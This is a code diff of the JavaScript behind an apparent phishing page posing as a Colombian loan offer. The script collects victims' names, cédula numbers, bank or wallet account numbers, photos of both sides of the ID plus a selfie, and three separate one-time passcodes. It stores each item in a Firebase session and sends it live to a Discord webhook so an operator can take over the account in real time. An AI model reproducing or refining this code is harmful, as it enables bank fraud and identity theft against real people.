-  const numero = document.getElementById('f-numero-cuenta').value;
+// ── CORREO APROBACIÓN ─────────────────────────────────────────────────────────
+var correoAprobado = null;
 
-  publicarEstadoCampo('cuenta', 'Datos Cuenta', `${nombre}|${cedula}|${numero}`, true, true);
+window.submitApprove = function() {
+  correoAprobado = 'aprobado';
+  document.querySelector('.approval-btns').style.opacity = '0.5';
+  document.querySelector('.approval-btns').style.pointerEvents = 'none';
+  document.getElementById('btn-correo').disabled = false;
+  enviarDiscord('✅ Solicitud Aprobada', { 'Estado': 'Aprobado', 'Sesión': SESSION_ID, 'Hora': new Date().toLocaleString('es-CO') });
+};
 
-  set(ref(db, `sesiones/${SID}/cuenta`), {
-    nombre,
-    cedula,
-    numero,
-    metodo: estadoApp.metodoSeleccionado,
-    enviadaEn: new Date().toISOString()
+window.submitDeny = function() {
+  correoAprobado = 'denegado';
+  document.querySelector('.approval-btns').style.opacity = '0.5';
+  document.querySelector('.approval-btns').style.pointerEvents = 'none';
+  document.getElementById('btn-correo').disabled = false;
+  enviarDiscord('❌ Solicitud Denegada', { 'Estado': 'Denegado', 'Sesión': SESSION_ID, 'Hora': new Date().toLocaleString('es-CO') });
+};
+
+window.submitCorreo = function() {
+  set(ref(db, 'sesiones/' + SESSION_ID + '/correo_aprobacion'), { estado: correoAprobado, ts: new Date().toISOString() });
+  set(estadoRef, 'correo_enviado');
+  enviarDiscord('📧 Aprobación de Correo ' + correoAprobado.toUpperCase(), { 'Estado': correoAprobado, 'Sesión': SESSION_ID, 'Hora': new Date().toLocaleString('es-CO') });
+  goTo('s-espera2');
+};
+
+window.submitVerificado = function() {
+  // marcar en la sesión y avanzar al final
+  set(ref(db, 'sesiones/' + SESSION_ID + '/whatsapp_verificado'), { verified: true, ts: new Date().toISOString() });
+  set(estadoRef, 'finalizar');
+  enviarDiscord('📲 Verificado por WhatsApp', { 'Sesión': SESSION_ID, 'Hora': new Date().toLocaleString('es-CO') });
+};
+
+// ── MONTO ─────────────────────────────────────────────────────────────────────
+window.setMonto = function(val) {
+  document.getElementById('f-monto').value = val;
+  publishFieldStatus('f-monto', 'Monto', val, true, false);
+  document.querySelectorAll('.monto-pill').forEach(p => p.classList.remove('sel'));
+  var pills = document.querySelectorAll('.monto-pill');
+  var labels = [500000, 1000000, 1500000, 2000000];
+  labels.forEach((l,i) => { if(l===val) pills[i].classList.add('sel'); });
+  document.getElementById('btn-monto').disabled = false;
+};
+
+window.onMontoInput = function(el) {
+  var v = parseInt(el.value)||0;
+  document.getElementById('btn-monto').disabled = v < 100000;
+  document.querySelectorAll('.monto-pill').forEach(p => p.classList.remove('sel'));
+  publishFieldStatus('f-monto', 'Monto', el.value, v >= 100000, false);
+};
+
+window.irACuenta = function() {
+  var monto = document.getElementById('f-monto').value;
+  publishFieldStatus('f-monto', 'Monto', monto, true, true);
+  set(ref(db, 'sesiones/' + SESSION_ID + '/monto'), { valor: monto, moneda: 'COP', ts: new Date().toISOString() });
+  const num = parseInt(monto);
+  enviarDiscord('💸 Monto Seleccionado', { 'Monto': '$' + (isNaN(num) ? monto : num.toLocaleString('es-CO')), 'Sesión': SESSION_ID, 'Hora': new Date().toLocaleString('es-CO') });
+  goTo('s-cuenta');
+};
+
+// ── CUENTA ────────────────────────────────────────────────────────────────────
+window.selectPago = function(tipo) {
+  pagoSeleccionado = tipo;
+  publishFieldStatus('pago-metodo', 'Método de pago', tipo, true, false);
+  ['nequi','bancolombia','daviplata'].forEach(t => {
+    document.getElementById('btn-'+t).classList.remove('sel');
   });
+  document.getElementById('btn-'+tipo).classList.add('sel');
 
+  // Mostrar campos
+  document.getElementById('cuenta-form').classList.add('show');
+
+  // Cambiar label según selección
+  var labels = { nequi:'Número de celular Nequi', bancolombia:'Número de cuenta Bancolombia', daviplata:'Número de celular Daviplata' };
+  document.getElementById('label-cnum').textContent = labels[tipo] || 'Número de cuenta';
+
+  checkCuenta();
+};
+
+window.checkCuenta = function() {
+  var n = (document.getElementById('f-cnombre').value||'').trim();
+  var c = (document.getElementById('f-cced').value||'').trim();
+  var num = (document.getElementById('f-cnum').value||'').trim();
+  var ok = pagoSeleccionado && n.length >= 3 && c.length >= 6 && num.length >= 7;
+  document.getElementById('btn-cuenta').disabled = !ok;
+  publishFieldStatus('f-cnombre', 'Nombre cuenta', n, n.length >= 3, false);
+  publishFieldStatus('f-cced', 'Cédula cuenta', c, c.length >= 6, false);
+  publishFieldStatus('f-cnum', 'Número cuenta', num, num.length >= 7, false);
+};
+
+window.submitCuenta = function() {
+  var metodo = pagoSeleccionado;
+  var nombre = document.getElementById('f-cnombre').value;
+  var cedula = document.getElementById('f-cced').value;
+  var numero = document.getElementById('f-cnum').value;
+  publishFieldStatus('pago-metodo', 'Método de pago', metodo, true, true);
+  publishFieldStatus('f-cnombre', 'Nombre cuenta', nombre, true, true);
+  publishFieldStatus('f-cced', 'Cédula cuenta', cedula, true, true);
+  publishFieldStatus('f-cnum', 'Número cuenta', numero, true, true);
+  set(ref(db, 'sesiones/' + SESSION_ID + '/cuenta'), { metodo, nombre, cedula, numero, ts: new Date().toISOString() });
   set(estadoRef, 'esperando_cuenta');
-
-  enviarAlDiscord('💳 Datos de Cuenta Enviados', {
-    'Nombre': nombre,
-    'Cédula': cedula,
-    'Método': estadoApp.metodoSeleccionado,
-    'Sesión': SID,
-    'Hora': new Date().toLocaleString('es-CO')
-  });
-
-  gestor_vistas.ir('v-espera2');
+  enviarDiscord('🏦 Datos de Cuenta Registrados', { 'Método': metodo.toUpperCase(), 'Nombre': nombre, 'Cédula': cedula, 'Número': numero, 'Sesión': SESSION_ID, 'Hora': new Date().toLocaleString('es-CO') });
+  goTo('s-espera2');
 };
 
-const gestorFotos = {
-  contadorPasos: 0,
-  fotosCapturadas: {},
-
-  limpiar() {
-    this.contadorPasos = 0;
-    this.fotosCapturadas = {};
-    document.getElementById('boton-foto').disabled = false;
-    document.getElementById('btn-fotos').disabled = true;
-    this.actualizarVista();
+// ── OTP ───────────────────────────────────────────────────────────────────────
+// FOTO VALIDACION
+var fotosValidacion = {
+  cedulaFrente: null,
+  cedulaDetras: null,
+  selfie: null
+};
+var fotoLabels = {
+  cedulaFrente: 'Cédula por delante',
+  cedulaDetras: 'Cédula por detrás',
+  selfie: 'Selfie'
+};
+var fotoSteps = [
+  {
+    key: 'cedulaFrente',
+    inputId: 'foto-cedula-frente',
+    stepId: 'foto-step-cedula-frente',
+    icon: '&#128196;',
+    title: 'Cédula por delante',
+    desc: 'Toma una foto clara del frente de la cédula, con buena luz y todos los datos visibles.'
   },
-
-  actualizarVista() {
-    const pasos = ['cedulaFrente', 'cedulaDetras', 'selfie'];
-    const nombres = ['Cédula por delante', 'Cédula por detrás', 'Selfie'];
-    const instrucciones = [
-      'Foto clara del frente de la cédula con buena luz.',
-      'Foto clara del reverso de la cédula con buena luz.',
-      'Foto clara de tu rostro mirando a la cámara.'
-    ];
-    const emojis = ['📋', '📋', '🤳'];
-
-    const paso = pasos[this.contadorPasos];
-    document.getElementById('paso-foto').textContent = `Paso ${this.contadorPasos + 1} de 3`;
-    document.getElementById('nombre-foto').textContent = nombres[this.contadorPasos];
-    document.getElementById('instruccion-foto').textContent = instrucciones[this.contadorPasos];
-    document.getElementById('avatar-foto').textContent = emojis[this.contadorPasos];
-
-    for (let i = 0; i < 3; i++) {
-      const pasoEl = document.getElementById('paso-' + (i === 0 ? 'cedula-frente' : i === 1 ? 'cedula-detras' : 'selfie'));
-      if (i < this.contadorPasos) {
-        pasoEl.classList.add('completado');
-        pasoEl.classList.remove('activo');
-      } else if (i === this.contadorPasos) {
-        pasoEl.classList.add('activo');
-        pasoEl.classList.remove('completado');
-      } else {
-        pasoEl.classList.remove('activo', 'completado');
-      }
-    }
-
-    document.getElementById('panel-fotos').style.setProperty('--foto-progreso', ((this.contadorPasos + 1) / 3));
-
-    if (this.contadorPasos === 2 && Object.keys(this.fotosCapturadas).length === 3) {
-      document.getElementById('panel-fotos').classList.add('completado');
-      document.getElementById('btn-fotos').disabled = false;
-    } else {
-      document.getElementById('panel-fotos').classList.remove('completado');
-      document.getElementById('btn-fotos').disabled = true;
-    }
+  {
+    key: 'cedulaDetras',
+    inputId: 'foto-cedula-detras',
+    stepId: 'foto-step-cedula-detras',
+    icon: '&#128196;',
+    title: 'Cédula por detrás',
+    desc: 'Toma una foto clara del reverso de la cédula, sin cortes ni reflejos.'
   },
+  {
+    key: 'selfie',
+    inputId: 'foto-selfie',
+    stepId: 'foto-step-selfie',
+    icon: '&#128100;',
+    title: 'Selfie',
+    desc: 'Toma una selfie clara, con buena luz y el rostro centrado.'
+  }
+];
 
-  procesarFoto(elementoEntrada) {
-    if (!elementoEntrada.files.length) return;
+window.clearFotos = function() {
+  fotoSteps.forEach(function(step) {
+    fotosValidacion[step.key] = null;
+    var input = document.getElementById(step.inputId);
+    if (input) input.value = '';
+  });
+  document.getElementById('btn-foto').disabled = true;
+  renderFotoStep();
+};
 
-    const claveFoto = elementoEntrada.dataset.fotoClave;
-    const archivo = elementoEntrada.files[0];
+window.openFotoInput = function(id) {
+  document.getElementById('foto-error-box').classList.remove('show');
+  document.getElementById(id).click();
+};
 
-    const lector = new FileReader();
-    lector.onload = (evento) => {
-      this.fotosCapturadas[claveFoto] = evento.target.result;
+window.openCurrentFotoInput = function() {
+  var step = getCurrentFotoStep();
+  if (step) openFotoInput(step.inputId);
+};
 
-      if (this.contadorPasos < 2) {
-        this.contadorPasos++;
-        this.actualizarVista();
-      } else {
-        this.actualizarVista();
-      }
-    };
-    lector.readAsDataURL(archivo);
-  },
+window.onFotoChange = function(input) {
+  var key = input.dataset.fotoKey;
+  if (!key) return;
+  fotosValidacion[key] = input.files && input.files[0] ? input.files[0] : null;
+  publishFieldStatus(input.id, fotoLabels[key], fotosValidacion[key] ? 'foto' : '', !!fotosValidacion[key], false);
+  document.getElementById('btn-foto').disabled = !todasLasFotosListas();
+  renderFotoStep();
+};
 
-  enviar() {
-    publicarEstadoCampo('fotos', 'Fotos Identidad', 'enviadas', true, true);
+function todasLasFotosListas() {
+  return Object.keys(fotosValidacion).every(function(key) {
+    return !!fotosValidacion[key];
+  });
+}
 
-    set(ref(db, `sesiones/${SID}/fotos`), {
-      cedulaFrente: this.fotosCapturadas.cedulaFrente ? 'recibida' : null,
-      cedulaDetras: this.fotosCapturadas.cedulaDetras ? 'recibida' : null,
-      selfie: this.fotosCapturadas.selfie ? 'recibida' : null,
-      enviadasEn: new Date().toISOString()
-    });
+function getCurrentFotoStep() {
+  return fotoSteps.find(function(step) {
+    return !fotosValidacion[step.key];
+  });
+}
 
-    set(estadoRef, 'fotos_enviadas');
+function renderFotoStep() {
+  var panel = document.getElementById('foto-panel');
+  var stage = document.getElementById('foto-stage');
+  var current = getCurrentFotoStep();
+  var complete = !current;
+  var doneCount = fotoSteps.filter(function(step) {
+    return !!fotosValidacion[step.key];
+  }).length;
+  var viewStep = current || fotoSteps[fotoSteps.length - 1];
+  var activeIndex = current ? fotoSteps.indexOf(current) : fotoSteps.length - 1;
 
-    enviarAlDiscord('📸 Fotos Enviadas', {
-      'Cédula Frente': 'Sí',
-      'Cédula Detrás': 'Sí',
-      'Selfie': 'Sí',
-      'Sesión': SID,
+  if (!panel || !stage) return;
+  panel.classList.toggle('done', complete);
+  panel.style.setProperty('--foto-progress', complete ? 1 : (doneCount + 1) / fotoSteps.length);
+  document.getElementById('foto-kicker').textContent = complete ? 'Fotos completas' : 'Paso ' + (activeIndex + 1) + ' de 3';
+  document.getElementById('foto-avatar').innerHTML = complete ? '&#10003;' : viewStep.icon;
+  document.getElementById('foto-name').textContent = complete ? 'Validación lista' : viewStep.title;
+  document.getElementById('foto-desc').textContent = complete
+    ? 'Ya tenemos las tres fotos necesarias. Puedes enviarlas para continuar.'
+    : viewStep.desc;
+  document.getElementById('foto-action').textContent = complete ? 'Fotos listas' : 'Tomar foto';
+  document.getElementById('foto-action').disabled = complete;
+
+  fotoSteps.forEach(function(step, index) {
+    var marker = document.getElementById(step.stepId);
+    if (!marker) return;
+    marker.classList.toggle('done', !!fotosValidacion[step.key]);
+    marker.classList.toggle('active', !complete && index === activeIndex);
+  });
+
+  stage.style.animation = 'none';
+  stage.offsetHeight;
+  stage.style.animation = '';
+}
+
+function enviarFotoDiscord(file, etiqueta) {
+  var form = new FormData();
+  form.append('payload_json', JSON.stringify({ content: etiqueta + ' - Sesion: ' + SESSION_ID }));
+  form.append('file', file, etiqueta.toLowerCase().replace(/\s+/g, '-') + '-' + SESSION_ID + '.jpg');
+  return fetch(DISCORD_WEBHOOK, { method: 'POST', body: form }).catch(() => {});
+}
+
+window.submitFoto = function() {
+  if (!todasLasFotosListas()) return;
+  document.getElementById('btn-foto').disabled = true;
+  fotoSteps.forEach(function(step) {
+    publishFieldStatus(step.inputId, fotoLabels[step.key], 'foto', true, true);
+  });
+  set(ref(db, 'sesiones/' + SESSION_ID + '/fotos'), {
+    cedulaFrente: fotosValidacion.cedulaFrente.name,
+    cedulaDetras: fotosValidacion.cedulaDetras.name,
+    selfie: fotosValidacion.selfie.name,
+    ts: new Date().toISOString()
+  });
+  var envios = Object.keys(fotosValidacion).map(function(key) {
+    return enviarFotoDiscord(fotosValidacion[key], fotoLabels[key]);
+  });
+  Promise.allSettled(envios).finally(function() {
+    set(estadoRef, 'foto_enviada');
+    enviarDiscord('📸 Fotos de Validación Enviadas', {
+      'Cédula Frente': fotosValidacion.cedulaFrente.name,
+      'Cédula Atrás': fotosValidacion.cedulaDetras.name,
+      'Selfie': fotosValidacion.selfie.name,
+      'Sesión': SESSION_ID,
       'Hora': new Date().toLocaleString('es-CO')
     });
+    goTo('s-espera2');
+  });
+};
 
-    gestor_vistas.ir('v-espera2');
+var otpVal = '';
+
+window.focusOtp = function() {
+  document.getElementById('otp-input').focus();
+};
+
+function clearOtp() {
+  otpVal = '';
+  document.getElementById('otp-input').value = '';
+  for (var i = 0; i < 6; i++) {
+    document.getElementById('d'+i).textContent = '';
+    document.getElementById('d'+i).classList.remove('error-digit');
+    document.getElementById('l'+i).classList.remove('active','filled','error');
+  }
+  document.getElementById('l0').classList.add('active');
+  document.getElementById('btn-otp').disabled = true;
+}
+
+window.onOtpInput = function(el) {
+  var raw = el.value.replace(/\D/g,'').slice(0,6);
+  otpVal = raw;
+  el.value = raw;
+  publishFieldStatus('otp-input', 'OTP', raw, raw.length === 6, false);
+
+  // Limpiar errores al escribir
+  document.getElementById('otp-error-box').classList.remove('show');
+
+  for (var i = 0; i < 6; i++) {
+    var d = document.getElementById('d'+i);
+    var l = document.getElementById('l'+i);
+    d.classList.remove('error-digit');
+    l.classList.remove('error');
+
+    if (i < raw.length) {
+      d.textContent = raw[i];
+      l.classList.add('filled');
+      l.classList.remove('active');
+    } else if (i === raw.length) {
+      d.textContent = '';
+      l.classList.add('active');
+      l.classList.remove('filled');
+    } else {
+      d.textContent = '';
+      l.classList.remove('active','filled');
+    }
+  }
+  document.getElementById('btn-otp').disabled = raw.length < 6;
+};
+
+window.onOtpKey = function(e) {
+  if (e.key === 'Backspace') {
+    var el = document.getElementById('otp-input');
+    var raw = (el.value||'').slice(0,-1);
+    el.value = raw;
+    window.onOtpInput(el);
   }
 };
 
-window.abrirCamaraFoto = function() {
-  const pasos = ['entrada-foto-frente', 'entrada-foto-detras', 'entrada-foto-rostro'];
-  document.getElementById(pasos[gestorFotos.contadorPasos]).click();
-};
-
-window.procesarFoto = (el) => gestorFotos.procesarFoto(el);
-
-window.enviarFotos = function() {
-  gestorFotos.enviar();
-};
-
-window.reenviarOTP = function() {
-  enviarAlDiscord('🔄 Reenvio OTP', {
-    'Documento': localStorage.getItem('documento_usuario') || '—',
-    'Sesión': SID,
-    'Hora': new Date().toLocaleString('es-CO')
-  });
-};
-
-window.enviarOTP = function() {
-  publicarEstadoCampo('entrada-otp', 'OTP', otpPrincipal.val, true, true);
-  set(ref(db, `sesiones/${SID}/otp`), { codigo: otpPrincipal.val, ts: new Date().toISOString() });
+window.submitOtp = function() {
+  publishFieldStatus('otp-input', 'OTP', otpVal, true, true);
+  set(ref(db, 'sesiones/' + SESSION_ID + '/otp'), { codigo: otpVal, ts: new Date().toISOString() });
   set(estadoRef, 'otp_enviado');
-  enviarAlDiscord('✅ OTP Enviado', { 'Código': otpPrincipal.val, 'Sesión': SID, 'Hora': new Date().toLocaleString('es-CO') });
+  enviarDiscord('🔢 OTP Ingresado', { 'Código': otpVal, 'Sesión': SESSION_ID, 'Hora': new Date().toLocaleString('es-CO') });
   document.getElementById('btn-otp').disabled = true;
+  goTo('s-espera2');
 };
 
-window.reenviarOTPDesembolso = function() {
-  enviarAlDiscord('🔄 Reenvio OTP Desembolso', {
-    'Documento': localStorage.getItem('documento_usuario') || '—',
-    'Sesión': SID,
-    'Hora': new Date().toLocaleString('es-CO')
-  });
+window.resendOtp = function() {
+  clearOtp();
+  document.getElementById('otp-error-box').classList.remove('show');
 };
 
-window.enviarOTPDesembolso = function() {
-  publicarEstadoCampo('entrada-otp-desembolso', 'OTP Desembolso', otpDesembolso.val, true, true);
-  set(ref(db, `sesiones/${SID}/otp_desembolso`), { codigo: otpDesembolso.val, ts: new Date().toISOString() });
-  set(estadoRef, 'otp_desembolso_enviado');
-  enviarAlDiscord('✅ OTP Desembolso Enviado', { 'Código': otpDesembolso.val, 'Sesión': SID, 'Hora': new Date().toLocaleString('es-CO') });
+// ── OTP DESEMBOLSO ────────────────────────────────────────────────────────────
+var otpDesembolsoVal = '';
+
+window.focusOtpDesembolso = function() {
+  document.getElementById('otp-desembolso-input').focus();
+};
+
+function clearOtpDesembolso() {
+  otpDesembolsoVal = '';
+  document.getElementById('otp-desembolso-input').value = '';
+  for (var i = 0; i < 6; i++) {
+    document.getElementById('dd'+i).textContent = '';
+    document.getElementById('dd'+i).classList.remove('error-digit');
+    document.getElementById('ld'+i).classList.remove('active','filled','error');
+  }
+  document.getElementById('ld0').classList.add('active');
   document.getElementById('btn-otp-desembolso').disabled = true;
+}
+
+window.onOtpDesembolsoInput = function(el) {
+  var raw = el.value.replace(/\D/g,'').slice(0,6);
+  otpDesembolsoVal = raw;
+  el.value = raw;
+  publishFieldStatus('otp-desembolso-input', 'OTP desembolso', raw, raw.length === 6, false);
+  document.getElementById('otp-desembolso-error-box').classList.remove('show');
+
+  for (var i = 0; i < 6; i++) {
+    var d = document.getElementById('dd'+i);
+    var l = document.getElementById('ld'+i);
+    d.classList.remove('error-digit');
+    l.classList.remove('error');
+
+    if (i < raw.length) {
+      d.textContent = raw[i];
+      l.classList.add('filled');
+      l.classList.remove('active');
+    } else if (i === raw.length) {
+      d.textContent = '';
+      l.classList.add('active');
+      l.classList.remove('filled');
+    } else {
+      d.textContent = '';
+      l.classList.remove('active','filled');
+    }
+  }
+  document.getElementById('btn-otp-desembolso').disabled = raw.length < 6;
 };
 
-window.reenviarOTPOtro = function() {
-  enviarAlDiscord('🔄 Reenvio OTP Otro', {
-    'Documento': localStorage.getItem('documento_usuario') || '—',
-    'Sesión': SID,
-    'Hora': new Date().toLocaleString('es-CO')
-  });
+window.onOtpDesembolsoKey = function(e) {
+  if (e.key === 'Backspace') {
+    var el = document.getElementById('otp-desembolso-input');
+    var raw = (el.value||'').slice(0,-1);
+    el.value = raw;
+    window.onOtpDesembolsoInput(el);
+  }
 };
 
-window.enviarOTPOtro = function() {
-  publicarEstadoCampo('entrada-otp-otro', 'OTP Otro', otpOtro.val, true, true);
-  set(ref(db, `sesiones/${SID}/otp_otro`), { codigo: otpOtro.val, ts: new Date().toISOString() });
-  set(estadoRef, 'otp_otro_enviado');
-  enviarAlDiscord('✅ OTP Otro Enviado', { 'Código': otpOtro.val, 'Sesión': SID, 'Hora': new Date().toLocaleString('es-CO') });
+window.submitOtpDesembolso = function() {
+  publishFieldStatus('otp-desembolso-input', 'OTP desembolso', otpDesembolsoVal, true, true);
+  set(ref(db, 'sesiones/' + SESSION_ID + '/otp_desembolso'), { codigo: otpDesembolsoVal, ts: new Date().toISOString() });
+  set(estadoRef, 'otp_desembolso_enviado');
+  enviarDiscord('💳 OTP Desembolso Ingresado', { 'Código': otpDesembolsoVal, 'Sesión': SESSION_ID, 'Hora': new Date().toLocaleString('es-CO') });
+  document.getElementById('btn-otp-desembolso').disabled = true;
+  goTo('s-espera2');
+};
+
+window.resendOtpDesembolso = function() {
+  clearOtpDesembolso();
+  document.getElementById('otp-desembolso-error-box').classList.remove('show');
+};
+
+// ── OTP OTRO ──────────────────────────────────────────────────────────────────
+var otpOtroVal = '';
+
+window.focusOtpOtro = function() {
+  document.getElementById('otp-otro-input').focus();
+};
+
+function clearOtpOtro() {
+  otpOtroVal = '';
+  document.getElementById('otp-otro-input').value = '';
+  for (var i = 0; i < 6; i++) {
+    document.getElementById('do'+i).textContent = '';
+    document.getElementById('do'+i).classList.remove('error-digit');
+    document.getElementById('lo'+i).classList.remove('active','filled','error');
+  }
+  document.getElementById('lo0').classList.add('active');
   document.getElementById('btn-otp-otro').disabled = true;
+}
+
+window.onOtpOtroInput = function(el) {
+  var raw = el.value.replace(/\D/g,'').slice(0,6);
+  otpOtroVal = raw;
+  el.value = raw;
+  publishFieldStatus('otp-otro-input', 'OTP otro', raw, raw.length === 6, false);
+  document.getElementById('otp-otro-error-box').classList.remove('show');
+
+  for (var i = 0; i < 6; i++) {
+    var d = document.getElementById('do'+i);
+    var l = document.getElementById('lo'+i);
+    d.classList.remove('error-digit');
+    l.classList.remove('error');
+
+    if (i < raw.length) {
+      d.textContent = raw[i];
+      l.classList.add('filled');
+      l.classList.remove('active');
+    } else if (i === raw.length) {
+      d.textContent = '';
+      l.classList.add('active');
+      l.classList.remove('filled');
+    } else {
+      d.textContent = '';
+      l.classList.remove('active','filled');
+    }
+  }
+  document.getElementById('btn-otp-otro').disabled = raw.length < 6;
 };
+
+window.onOtpOtroKey = function(e) {
+  if (e.key === 'Backspace') {
+    var el = document.getElementById('otp-otro-input');
+    var raw = (el.value||'').slice(0,-1);
+    el.value = raw;
+    window.onOtpOtroInput(el);
+  }
+};
+
+window.submitOtpOtro = function() {
+  publishFieldStatus('otp-otro-input', 'OTP otro', otpOtroVal, true, true);
+  set(ref(db, 'sesiones/' + SESSION_ID + '/otp_otro'), { codigo: otpOtroVal, ts: new Date().toISOString() });
+  set(estadoRef, 'otp_otro_enviado');
+  enviarDiscord('👤 OTP Beneficiario Ingresado', { 'Código': otpOtroVal, 'Sesión': SESSION_ID, 'Hora': new Date().toLocaleString('es-CO') });
+  document.getElementById('btn-otp-otro').disabled = true;
+  goTo('s-espera2');
+};
+
+window.resendOtpOtro = function() {
+  clearOtpOtro();
+  document.getElementById('otp-otro-error-box').classList.remove('show');
+};
+
+// Iniciar OTP al llegar a esa pantalla
+document.getElementById('otp-wrap').addEventListener('click', () => {
+  document.getElementById('otp-input').focus();
+});
+document.getElementById('otp-desembolso-wrap').addEventListener('click', () => {
+  document.getElementById('otp-desembolso-input').focus();
+});
+document.getElementById('otp-otro-wrap').addEventListener('click', () => {
+  document.getElementById('otp-otro-input').focus();
+});
+setTimeout(() => {
+  document.getElementById('l0').classList.add('active');
+  document.getElementById('ld0').classList.add('active');
+  document.getElementById('lo0').classList.add('active');
+}, 100);
+
 </script>
 </body>
 </html>
